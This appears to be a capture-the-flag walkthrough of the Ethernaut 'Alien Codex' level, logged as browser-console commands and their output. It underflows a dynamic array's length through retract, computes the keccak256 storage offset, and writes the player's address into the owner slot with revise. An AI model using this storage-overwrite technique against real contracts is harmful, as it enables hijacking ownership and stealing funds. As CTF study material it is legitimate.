>await contract.abi
(11) [{…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}]
0: {constant: false, inputs: Array(2), name: 'revise', outputs: Array(0), payable: false, …}
1: {constant: true, inputs: Array(0), name: 'contact', outputs: Array(1), payable: false, …}
2: {constant: false, inputs: Array(0), name: 'retract', outputs: Array(0), payable: false, …}
3: {constant: false, inputs: Array(0), name: 'make_contact', outputs: Array(0), payable: false, …}
4: {constant: false, inputs: Array(0), name: 'renounceOwnership', outputs: Array(0), payable: false, …}
5: {constant: true, inputs: Array(0), name: 'owner', outputs: Array(1), payable: false, …}
6: {constant: true, inputs: Array(0), name: 'isOwner', outputs: Array(1), payable: false, …}
7: {constant: true, inputs: Array(1), name: 'codex', outputs: Array(1), payable: false, …}
8: {constant: false, inputs: Array(1), name: 'record', outputs: Array(0), payable: false, …}
9: {constant: false, inputs: Array(1), name: 'transferOwnership', outputs: Array(0), payable: false, …}
10: {anonymous: false, inputs: Array(2), name: 'OwnershipTransferred', type: 'event', constant: undefined, …}
length: 11
[[Prototype]]: Array(0)

>await contract.owner()
'0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272'

>await contract.contact()
false

>await contract.make_contact()
{tx: '0xc223773398fefde346210b099f65cba6a0ed1ef1d1558a9d3034b16000f4423c', receipt: {…}, logs: Array(0)}

>await web3.eth.getStorageAt(contract.address, 0, console.log) //single slot with two items 
'0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272' //same contract owner -> da5b3

>await contract.contact()
true 

//Modify codex length to 2256 by invoking retract:
>await contract.retract() 
 {tx: '0xeec2b183b5e29f05a21827df4fe47f0a425ea04a2757e54b03cebbc11e6ae8ee', receipt: {…}, logs: Array(0)}

Keccak256(k . p) 
k = key. value corresponding to the mapping 
p = position. storing the array length 

// starting with slot 1, which is where the length. array is defined
>p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))
'0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'

//Converting hashed value to BigInt, we're able to subtract back to Slot 0 of the codex
>i = BigInt(2 ** 256) - BigInt(p)
35707666377435648211887908874984608119992236509074197713628505308453184860938n

//Padding our address with 0's to meet the expected 32 byte length.
//Exploiting a flaw in the ABI specs - Doesn't validate that the length of the array matches the length of the payload 
>content = '0x' + '0'.repeat(24) + player.slice(2)
'0x000000000000000000000000F6eA8E869C68362eC2FA1b2159Fe459D6D8f30F5'

//place our content into the owner array index location 
//our address location of the index which is sitting at the zero location and we're going to take ownership of it
>contract.revise(i, content, {from:player, gas:900000}) // i = index 

//Hack Success!! validate we're owner! 
>await contract.owner()
'0xF6eA8E869C68362eC2FA1b2159Fe459D6D8f30F5'